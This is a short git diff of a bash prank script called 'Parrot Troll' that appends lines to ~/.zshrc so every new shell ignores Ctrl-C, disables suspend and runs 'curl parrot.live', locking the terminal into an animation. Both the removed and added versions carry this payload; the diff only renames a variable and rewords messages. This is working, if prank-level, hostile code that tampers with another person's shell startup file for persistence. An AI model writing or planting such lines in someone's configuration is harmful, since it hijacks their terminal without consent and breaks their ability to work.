@@ -1,15 +1,13 @@
 #!/bin/bash
 
-code_to_inject=$(cat << 'EOF'
+PARROT_TROLL=$(cat << 'EOF'
 trap '' 2
 stty susp undef
 curl parrot.live
 EOF
 )
 
-if ! grep -q "$code_to_inject" ~/.zshrc; then
-    echo "$code_to_inject" >> ~/.zshrc
-    echo "Parrot Troll successfully injected into ~/.zshrc"
-else
-    echo "Parrot Troll is already in ~/.zshrc"
+if ! grep -q "$PARROT_TROLL" ~/.zshrc; then
+    echo "$PARROT_TROLL" >> ~/.zshrc
+    echo "Parrot Troll 🦜 added to ~/.zshrc"
 fi
